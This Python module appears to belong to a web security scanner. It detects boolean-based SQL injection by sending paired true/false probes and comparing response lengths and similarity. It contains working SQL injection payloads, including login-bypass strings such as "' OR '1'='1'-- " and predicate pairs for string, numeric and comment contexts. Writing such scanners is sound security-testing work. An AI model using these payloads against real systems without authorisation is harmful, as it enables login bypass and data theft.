"""Bounded SQL differential procedures. All response processing stays local."""
import html
import json
import re
from difflib import SequenceMatcher
from urllib.parse import parse_qsl, quote, quote_plus


PROFILES = ('sql_string', 'sql_numeric', 'sql_comment', 'sql_login')


def login_user_fields(request):
    """Identify account fields only in a submitted form with a password field."""
    if request.get('method') != 'POST':
        return []
    body = request.get('body') or ''
    try:
        fields = json.loads(body)
    except ValueError:
        fields = dict(parse_qsl(body, keep_blank_values=True))
    if not isinstance(fields, dict):
        return []
    names = [name for name in fields if isinstance(name, str)]
    if not any(re.search(r'pass|pwd|비밀번호', name, re.I) for name in names):
        return []
    return [name for name in names if re.search(
        r'user|login|email|account|uname|(?:^|[_-])uid$|^id$|아이디|계정', name, re.I)]


def probes(profile, base, round_index=0):
    # Independent constants and reversed order reduce accidental/reflected differences.
    yes, no = ('7319', '7321') if round_index == 0 else ('8461', '8467')
    if profile == 'sql_login':
        attacks = [
            {'role': 'byp_sql2', 'value': "admin'-- "},
            {'role': 'byp_sql', 'value': "' OR '1'='1'-- "},
        ]
        return [{'role': 'baseline', 'value': f'zzq_invalid_{yes}'},
                *(attacks if round_index == 0 else reversed(attacks))]
    if profile == 'sql_numeric':
        true, false = f'{base} AND {yes}={yes}', f'{base} AND {yes}={no}'
    elif profile == 'sql_comment':
        true = f"{base}' OR '{yes}'='{yes}'-- "
        false = f"{base}' AND '{yes}'='{no}'-- "
    elif profile == 'sql_string':
        true, false = f"{base}' AND '{yes}'='{yes}", f"{base}' AND '{yes}'='{no}"
    else:
        raise ValueError('Unknown SQL confirmation profile')
    pair = [{'role': 'bool_true', 'value': true}, {'role': 'bool_false', 'value': false}]
    return [{'role': 'baseline', 'value': base}, *(pair if round_index == 0 else reversed(pair))]


def without_reflection(body, value):
    """A reflected test input is not evidence of query evaluation."""
    if value:
        for spelling in sorted({value, html.escape(value), html.escape(value, quote=False),
                                quote(value, safe=''), quote_plus(value)}, key=len, reverse=True):
            body = body.replace(spelling, '[input]')
    return body


def repeated_boolean_evidence(round_oracles):
    """Confirm a SQL predicate only when two independent, reversed pairs agree.

    The injected value is removed from each response before this check. A
    status change, reflected input, or a single length difference is not proof.
    """
    if len(round_oracles) != 2:
        return []
    pairs = []
    for oracle in round_oracles:
        by = {item['role']: item for item in oracle}
        if not all(role in by for role in ('baseline', 'bool_true', 'bool_false')):
            return []
        base, true, false = (by[role] for role in ('baseline', 'bool_true', 'bool_false'))
        if any(item.get('status') != 200 for item in (base, true, false)):
            return []
        bodies = [item.get('body') or '' for item in (base, true, false)]
        if not bodies[0]:
            return []
        base_len, true_len, false_len = map(len, bodies)
        gap = max(40, round(base_len * .08))
        true_similarity = SequenceMatcher(None, bodies[0][:32000], bodies[1][:32000]).quick_ratio()
        false_similarity = SequenceMatcher(None, bodies[0][:32000], bodies[2][:32000]).quick_ratio()
        baseline_preserved = (abs(true_len - base_len) <= max(64, round(base_len * .08))
                              and base_len - false_len >= gap
                              and true_similarity >= .90
                              and true_similarity - false_similarity >= .06)
        expanded = true_len - base_len >= gap and base_len - false_len >= gap
        if not (baseline_preserved or expanded):
            return []
        pairs.append((true_len, false_len, base_len))
    for index in (0, 1):
        lengths = [pair[index] for pair in pairs]
        if abs(lengths[0] - lengths[1]) > max(64, round(max(lengths) * .05)):
            return []
    return [{'name': '반복 불린 기반 SQLi (참/거짓 대조)',
             'evidence': '서로 다른 조건값 2회에서 참 응답은 정상 결과를 유지하거나 확장하고, 거짓 응답은 반복해서 결과가 감소함'}]
